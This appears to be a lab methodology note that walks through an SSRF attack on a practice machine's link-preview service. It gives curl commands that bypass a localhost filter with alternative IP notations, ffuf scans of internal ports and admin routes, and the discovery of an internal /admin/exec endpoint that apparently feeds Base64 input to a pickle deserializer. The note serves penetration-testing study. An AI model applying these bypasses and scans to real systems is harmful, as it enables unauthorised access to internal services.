---
type: methodology
project: OSCP-Exam-PoC
status: drafted
updated: "2026-11-07"
tags:
  - methodology
  - ssrf
  - url-validation
  - localhost
  - internal-services
  - python
  - oscp
---

# Server-Side Request Forgery (SSRF)

## 1. Purpose

Server-Side Request Forgery (SSRF) occurs when an application makes network requests based on user-controlled input, allowing an attacker to influence which destination the server contacts.

A URL-preview application is a common example:

```
GET /fetch?url=https://example.com
```

The browser sends a request to the public application. The application then makes a second request to the supplied URL and returns some or all of the resulting response.

This creates two network perspectives:

- The attacker's network connection to the public application.
    
- The application's network connection to the destination supplied in the URL.
    

The second connection may originate from a network environment that can access localhost-only services, private networks, internal APIs, and other resources unavailable directly to the attacker.

This document focuses on SSRF against URL-fetching applications that attempt to block internal destinations.

The primary examination example is IN-01.

## 2. Attack Model

A typical URL-fetching service follows this pattern:

<figure class="method-atlas-figure">
  <picture>
    <source media="(max-width: 520px)" type="image/svg+xml" srcset="/diagrams/methodology-atlas-ssrf-architecture-mobile.svg" />
    <img src="/diagrams/methodology-atlas-ssrf-architecture.svg" alt="SSRF / server-side request sequence: Attacker then Public Web Application then Server-Side HTTP Client then External or Internal Resource then Public Web Application then Attacker. Message labels: GET /fetch?url=https://example.com, Validate supplied URL, Request destination, Response, Return fetched content." width="960" height="730" loading="lazy" decoding="async" />
  </picture>
  <figcaption>Request, validation, destination response and return path. All original steps and labels are retained; refer to the surrounding methodology for evidence and limitations.</figcaption>
</figure>

The security boundary is the URL validation logic.

A vulnerable implementation may:

- Reject only a small list of internal hostnames.
    
- Check the textual hostname without resolving it.
    
- Handle alternative IP representations incorrectly.
    
- Validate the initial destination but handle redirects inconsistently.
    
- Permit access to internal services through DNS or hostname-resolution weaknesses.
    
- Return verbose network errors that disclose information about internal services.
    

The presence of a URL-fetching feature does not automatically establish an SSRF vulnerability. The ability to influence the server-side destination must be demonstrated.

## 3. Initial Reconnaissance

Start by identifying the application's intended functionality.

During IN-01, the landing page returned:

```
<!-- preview-service build token: IT{FLAG-SECRET}} -->
<h1>IT GATE Link Preview</h1>
<p>Preview any public URL:</p>
<p><code>GET /fetch?url=https://example.com</code></p>
<p><em>Internal addresses are blocked for security.</em></p>
```

The page disclosed:

|Finding|Significance|
|---|---|
|Link Preview application|Identifies URL-fetching functionality|
|`/fetch` endpoint|Primary endpoint for investigation|
|`url` parameter|User-controlled destination|
|HTTP and HTTPS examples|Expected URL schemes|
|Internal-address restriction|Explicit security boundary and likely test target|
|Gunicorn response header|Python WSGI application server|

The HTML comment also contained a build token explicitly labeled as a canary.

That value was not the user or root flag.

**Initial hypothesis:** The application may be vulnerable if its internal-address restriction can be bypassed.

## 4. Establish a Baseline

Before testing internal destinations, establish that the fetch functionality works normally.

### 4.1 Baseline request

```
TARGET='http://TARGET_IP:WEB_PORT/fetch'

curl -i -G --max-time 15 \
  --data-urlencode 'url=https://example.com' \
  "$TARGET"
```

Replace the target IP and web port with the current instance information.

Observed IN-01 response:

```
HTTP/1.1 200 OK
Server: gunicorn
Content-Type: text/html; charset=utf-8
Content-Length: 577
```

The body contained the HTML of Example Domain.

<badge color="success">Server-side fetching confirmed</badge>

This established that:

1. The endpoint accepts a URL parameter.
    
2. The application makes an HTTP request to the supplied destination.
    
3. The returned content is included in the response.
    

### 4.2 Understand the curl options

|Option|Purpose|
|---|---|
|`-i`|Include response headers|
|`-G`|Place supplied data in the URL query string|
|`--data-urlencode`|URL-encode the parameter value|
|`--max-time 15`|Set a maximum total request duration|

The single quotes protect special characters from shell interpretation.

### 4.3 Why the baseline matters

Without a working public destination, a failure against an internal address is ambiguous.

For example, a failed request might indicate:

- The URL was rejected by validation.
    
- DNS resolution failed.
    
- The destination port was closed.
    
- The HTTP client encountered a protocol error.
    
- The destination accepted a connection but did not respond.
    

The baseline establishes that the general fetch mechanism is operational before investigating these possibilities.

## 5. Identify the Internal-Address Filter

The application's landing page explicitly stated:

```
Internal addresses are blocked for security.
```

The first experiment compared ordinary representations of localhost against alternative IPv4 representations.

### 5.1 Test different localhost representations

```
TARGET='http://TARGET_IP:WEB_PORT/fetch'

for url in \
    'http://127.0.0.1/' \
    'http://localhost/' \
    'http://127.1/' \
    'http://2130706433/' \
    'http://0x7f000001/' \
    'http://0177.0.0.1/' \
    'http://[::1]/'
do
    printf '\n========== %s ==========\n' "$url"

    curl -sS -G --max-time 10 \
        --data-urlencode "url=$url" \
        -w '\nHTTP: %{http_code} | Size: %{size_download} bytes\n' \
        "$TARGET"
done
```

The tested representations included:

|Representation|Address form|
|---|---|
|`127.0.0.1`|Standard IPv4 loopback|
|`localhost`|Loopback hostname|
|`127.1`|Abbreviated IPv4 loopback representation|
|`2130706433`|Decimal integer representation|
|`0x7f000001`|Hexadecimal representation|
|`0177.0.0.1`|Octal-style IPv4 representation|
|`[::1]`|IPv6 loopback|

The representations are useful because URL validators, address parsers, DNS resolvers, and HTTP clients may interpret hostnames and IP addresses differently.

### 5.2 Observed results

The initial FFUF test produced:

|Input|HTTP status|Response size|
|---|---|---|
|`https://example.com`|200|577|
|`127.0.0.1`|403|25|
|`localhost`|403|25|
|`127.1`|502|230|
|`2130706433`|502|240|
|`0x7f000001`|502|240|
|`0177.0.0.1`|502|240|
|`[::1]`|403|25|

The 403 responses indicated explicit rejection.

The alternative representations produced a different response path.

At this stage, however, the 502 responses were not sufficient to prove that the intended internal service had been reached.

## 6. Interpret Errors Correctly

A major part of SSRF analysis is understanding what happens after the input passes validation.

The following response came from the `127.1` test:

```
HTTPConnectionPool(host='127.1', port=80):
Max retries exceeded with url: /

Caused by NewConnectionError:
Failed to establish a new connection: [Errno 111] Connection refused
```

This reveals more than the HTTP status.

The error identifies:

- The hostname supplied to the HTTP client.
    
- The destination port.
    
- The connection failure.
    
- The underlying socket error.
    

### 6.1 Response interpretation

|Observation|Interpretation|
|---|---|
|Explicit internal-address rejection|The filter rejected the destination|
|DNS resolution error|The hostname could not be resolved|
|Connection refused|The connection attempt reached a host where the destination port was not accepting connections|
|Connection timeout|No connection was established within the timeout|
|Read timeout|The connection was established, but the server did not return response data in time|
|SSH banner in an HTTP error|The client reached an SSH service but attempted to interpret its response as HTTP|
|Internal HTTP response|The fetcher successfully retrieved content from the internal service|

A 502 response is not proof of an SSRF bypass by itself.

The error details and a successful interaction with a known internal service provide stronger evidence.

## 7. Validate the Loopback Bypass

The next step was to use the alternative representation against ports with recognizable services.

### 7.1 Internal port 22

The following request attempted to retrieve the root page from loopback port 22:

```
curl -i -sS -G --max-time 12 \
  --data-urlencode 'url=http://127.1:22/' \
  "$TARGET"
```

The response included:

```
BadStatusLine(
  'SSH-2.0-OpenSSH_10.0p2 Debian-7+deb13u4\r\n'
)
```

This was not an HTTP response.

It was an SSH protocol banner returned by the internal service.

<badge color="success">Internal loopback access confirmed</badge>

The result established that the public fetch endpoint could reach an SSH service listening on the target's loopback interface through the `127.1` representation.

This is materially stronger evidence than a generic 502 or connection-refused response.

### 7.2 Why the SSH banner matters

The HTTP client expected an HTTP response.

Instead, the destination returned:

```
SSH-2.0-OpenSSH_10.0p2 Debian-7+deb13u4
```

The resulting `BadStatusLine` error exposed the actual protocol response.

This demonstrates that SSRF can reveal information about non-HTTP services even when the application cannot display them as normal HTTP content.

It also establishes that the fetcher is capable of reaching internal services beyond the public web application.

## 8. Internal Service Discovery

Once loopback access was established, the investigation shifted from URL-filter bypasses to identifying the internal services reachable through that primitive.

### 8.1 First port-discovery attempt

The initial port list was generated from the local Linux services database:

```
awk '$2 ~ /^[0-9]+\/tcp$/ {
    split($2, p, "/");
    print p[1]
}' /etc/services | sort -nu > ~/Desktop/IN01/tcp-ports.txt
```

This produced a list of known TCP service ports.

FFUF then substituted each port into the internal URL:

```
ffuf \
  -w ~/Desktop/IN01/tcp-ports.txt:PORT \
  -u 'http://TARGET_IP:WEB_PORT/fetch?url=http%3A%2F%2F127.1%3APORT%2F' \
  -mc all \
  -t 5 \
  -rate 5 \
  -timeout 5 \
  -of json \
  -o ~/Desktop/IN01/loopback-ports.json
```

This approach tested whether the fetcher could obtain a response from each candidate port.

The outer HTTP response was still produced by the public `/fetch` application, so the status code alone did not represent the internal service's status.

### 8.2 Initial results

Two ports stood out:

|Internal port|Response size|Behavior|Assessment|
|---|---|---|---|
|22|98 bytes|SSH banner caused an HTTP protocol error|SSH confirmed|
|8080|90 bytes|Read timeout|TCP connection apparently accepted; application not identified|

The other results were largely connection-refused errors.

### 8.3 Investigating port 8080

Port 8080 repeatedly produced:

```
HTTPConnectionPool(host='127.1', port=8080):
Read timed out. (read timeout=4)
```

Changing the requested protocol to HTTPS did not produce a useful TLS or HTTP response.

A directory wordlist was then tested against this port.

That approach was abandoned because:

- The service had not been identified as an HTTP application.
    
- Requests consistently timed out.
    
- The large wordlist was taking too long.
    
- The lab instance had an auto-destroy limit.
    
- No usable path discoveries were produced.
    

**Conclusion:** Port 8080 remained an unidentified service. It was not established as the intended application, and further directory fuzzing was not justified.

This is an important example of when to stop a discovery technique instead of increasing its size.

See [[Fuzzing Strategy and False Leads]].

### 8.4 Targeted port discovery

A smaller list of likely application and database ports was tested:

```
3000
3001
4000
5000
5001
8000
8001
8008
8081
8443
8888
9000
9001
9090
9200
11211
2375
3306
5432
6379
27017
```

The investigation compared response status, response size, duration, and body content.

This produced a materially different result for port 9000.

### 8.5 Internal API discovered on port 9000

The following request successfully retrieved the internal service's root page:

```
curl -sS --max-time 10 -i -G \
  --data-urlencode 'url=http://127.1:9000/' \
  "$TARGET"
```

Observed response:

```
HTTP/1.1 200 OK
Server: gunicorn
Content-Type: text/html; charset=utf-8
Content-Length: 44
```

Response body:

```
IT GATE internal admin API (localhost only)
```

<badge color="success">Internal HTTP service confirmed</badge>

This was the decisive internal-service discovery.

The response established that:

- A web application was listening on loopback port 9000.
    
- The service identified itself as an internal admin API.
    
- The service was intended to be accessible only from localhost.
    
- The public URL-fetching endpoint could reach it through the `127.1` representation.
    

At this point, the investigation had moved from a general SSRF hypothesis to a confirmed internal API exposure.

## 9. Internal API Endpoint Discovery

The next task was to identify the routes exposed by the internal admin API.

### 9.1 Establish a negative control

Before fuzzing, request a deliberately nonexistent route:

```
curl -sS --max-time 7 -G \
  --data-urlencode 'url=http://127.1:9000/definitely-not-a-real-route-94821' \
  -w '\nHTTP=%{http_code} SIZE=%{size_download} TIME=%{time_total}s\n' \
  "$TARGET"
```

Observed result:

```
HTTP=404
SIZE=207
```

This established the generic 404 response fingerprint.

### 9.2 Initial endpoint wordlist

A small API-oriented wordlist tested candidates such as:

```
health
status
info
version
docs
openapi.json
swagger.json
admin
admin/health
admin/status
admin/flag
admin/user
admin/users
config
debug
metrics
internal
internal/health
internal/flag
```

The initial scan returned the same 207-byte response for all 34 entries.

No endpoint was identified.

This result was important because it established that generic API route guessing had not revealed the handler.

### 9.3 Why the first scan did not reveal the endpoint

The scan used:

```
-fs 90
```

This filtered the earlier port 8080 timeout response, not the actual 207-byte 404 response from the internal API.

Consequently, the generic 404 results appeared in FFUF output.

The correct comparison was the negative-control response:

```
HTTP 404
207 bytes
```

The lesson is to establish the response fingerprint for the specific service being fuzzed.

### 9.4 Targeted route discovery

After a broader API wordlist and automatic calibration produced no useful results, a more specific list was created with administrative operation names:

```
admin/exec
admin/execute
admin/command
admin/run
admin/shell
admin/ssh
admin/keys
admin/config
admin/secrets
admin/credentials
internal/admin
internal/exec
api/admin/exec
api/v1/exec
```

The scan was configured to filter ordinary 404 responses:

```
ffuf \
  -w ~/Desktop/IN01/admin-api-targeted.txt:FUZZ \
  -u 'http://TARGET_IP:WEB_PORT/fetch?url=http%3A%2F%2F127.1%3A9000%2FFUZZ' \
  -enc 'FUZZ:urlencode' \
  -mc all \
  -fc 404 \
  -t 40 \
  -rate 0 \
  -timeout 4 \
  -maxtime 30 \
  -of json \
  -o ~/Desktop/IN01/admin-api-targeted.json
```

One response differed from the generic 404 baseline:

```
400
23 bytes
/admin/exec
```

The endpoint was then requested individually.

Observed response:

```
HTTP/1.1 400 BAD REQUEST
Content-Length: 23
```

Body:

```
error: Ran out of input
```

This indicated that the route reached a handler that attempted to process input.

The exact behavior was not yet established from the first error alone.

## 10. Discover the Internal API's Input Contract

The `Ran out of input` error suggested that the handler attempted to parse an empty input stream.

The investigation then tested parameter names rather than continuing to guess route names.

### 10.1 Parameter discovery

A parameter wordlist was used against the confirmed `/admin/exec` endpoint.

The relevant result was:

```
400  105  /admin/exec?data=x
```

A second result involving a parameter name containing `localhost` returned 403. That response was treated as a possible filter interaction, not a valid application parameter discovery.

The `data` parameter was the useful finding.

### 10.2 Compare empty and invalid input

The following requests were compared:

```
/admin/exec?data=
```

Response:

```
error: Ran out of input
```

And:

```
/admin/exec?data=x
```

Response:

```
error: Invalid base64-encoded string:
number of data characters (1) cannot be 1 more than a multiple of 4
```

The second error established that the supplied parameter was being processed as Base64.

The empty-input error was consistent with Python pickle deserialization receiving an empty byte stream.

**Working conclusion:** The handler appeared to Base64-decode the `data` parameter and pass the decoded bytes to a Python deserializer, likely `pickle.loads()`.

The deserialization mechanism was subsequently validated through a harmless serialized input and the successful execution primitive.

Further technical details belong in [[Deserialization]].

## 11. Redirect Behavior

Redirect handling must be tested separately from direct URL validation.

A URL fetcher might validate the original destination but mishandle a later redirect to an internal address. Conversely, the application may validate both destinations.

### 11.1 Public redirect test

The following public redirect was tested:

```
https://httpbin.org/redirect-to?url=https%3A%2F%2Fexample.com
```

Observed result:

```
HTTP 302
Size 0
```

The fetcher returned the redirect response rather than returning the final Example Domain HTML.

### 11.2 Redirect to canonical localhost

A redirect pointing to:

```
http://127.0.0.1:22/
```

was rejected:

```
HTTP/1.1 403 FORBIDDEN
```

Response:

```
Forbidden redirect target: redirect target is an internal address
```

This established that redirect destinations were subjected to a separate internal-address check.

### 11.3 Direct URL versus redirect

|Test|Result|
|---|---|
|Direct request to canonical `127.0.0.1`|403|
|Direct request to `127.1`|Alternative validation path; internal services later confirmed reachable|
|Public redirect to public URL|302 returned|
|Public redirect to canonical `127.0.0.1:22`|403|

The redirect tests did not produce a successful bypass.

The direct `127.1` route was the confirmed path, so redirect experimentation was abandoned.

**Lesson:** Do not assume a redirect-based SSRF bypass works merely because direct URL validation is weak. Test the initial URL and redirect destination independently.

## 12. Important Technical Lessons

### 12.1 Distinguish the two network perspectives

The following requests target different systems:

```
http://127.1:9000/
```

Opened directly in Kali, this targets Kali's own loopback interface.

Passed as the `url` parameter to the public fetch endpoint, it targets the web application's loopback interface.

The distinction is fundamental to understanding SSRF.

### 12.2 A successful HTTP status is not the only useful result

The internal SSH service returned a protocol banner that the HTTP client could not parse.

The resulting 502 still contained valuable evidence.

The same principle applies to:

- TLS errors.
    
- Protocol mismatch errors.
    
- Connection-refused errors.
    
- DNS resolution failures.
    
- Timeouts.
    

Interpret the underlying error instead of classifying every non-200 response as failure.

### 12.3 Do not confuse service discovery with directory discovery

Internal port discovery and internal web path discovery are separate tasks.

The correct sequence was:

1. Identify an internal service.
    
2. Confirm its protocol or response.
    
3. Establish a normal response.
    
4. Establish a negative-control response.
    
5. Discover application routes.
    
6. Investigate the discovered handler.
    

The unsuccessful 8080 directory scan demonstrated why this order matters.

### 12.4 Use a negative control before filtering FFUF results

A filter based on the wrong response size can hide useful results or leave thousands of uninteresting results visible.

For IN-01, the internal API's generic 404 response was 207 bytes.

That baseline was specific to port 9000. It should not have been reused for port 8080 or another service without verification.

### 12.5 Stop when the evidence no longer justifies the technique

The 4.6K-entry directory scan against port 8080 was stopped because:

- It was progressing slowly.
    
- It generated many errors.
    
- The service was not identified as HTTP.
    
- No usable partial results were obtained.
    
- The instance was subject to automatic destruction.
    

The investigation improved when it moved to bounded, hypothesis-driven service discovery.

### 12.6 Revalidate after an instance reset

The public IP remained the same, but the externally assigned ports changed.

The previous findings were useful hypotheses, not guaranteed properties of the replacement instance.

After a reset, revalidate:

- Public fetch behavior.
    
- The loopback bypass.
    
- Internal service availability.
    
- Negative-control response fingerprints.
    

Do not assume the new instance has identical state.

## 13. SSRF Investigation Checklist

### Initial validation

- Identify the URL-fetching endpoint.
    
- Identify the URL parameter.
    
- Confirm a normal public fetch.
    
- Record response status, headers, and body.
    
- Identify stated internal-address restrictions.
    

### Filter testing

- Test canonical localhost.
    
- Test the `localhost` hostname.
    
- Test IPv4 and IPv6 loopback representations.
    
- Compare response bodies, not only status codes.
    
- Distinguish validation errors from connection errors.
    
- Confirm the bypass against a recognizable internal service.
    

### Internal discovery

- Establish the internal service's normal response.
    
- Identify likely internal ports.
    
- Investigate protocol-specific errors.
    
- Record internal service banners and application names.
    
- Establish a negative-control route response.
    
- Perform bounded endpoint discovery.
    
- Investigate parameter names where route behavior suggests an input parser.
    

### Redirect analysis

- Test a public redirect.
    
- Test a redirect to a canonical internal address.
    
- Compare direct and redirected destinations.
    
- Do not assume redirects are followed or bypass validation.
    

### Evidence and handoff

- Preserve exact requests and responses.
    
- Record instance IP and assigned ports.
    
- Record the successful internal destination.
    
- Link the resulting application or deserialization finding.
    
- Distinguish confirmed access from speculative leads.
    

## 14. Related Notes

### Machine Documentation

- [[IN-01 Overview]]
    
- [[Difficulty Levels/Insane/IN-01/user]]
    
- [[Difficulty Levels/Insane/IN-01/root]]
    

### Methodology

- [[Reconnaissance]]
    
- [[Web Enumeration]]
    
- [[Deserialization]]
    
- [[Initial Access]]
    
- [[Evidence Collection]]
    

### Difficulties and Lessons

- [[Network and ISP Restrictions]]
    
- [[VPN Routing and Reverse Shells]]
    
- [[Kali PATH and Zsh Issues]]
    
- [[Fuzzing Strategy and False Leads]]
    
- [[Tooling and Workflow Mistakes]]
    

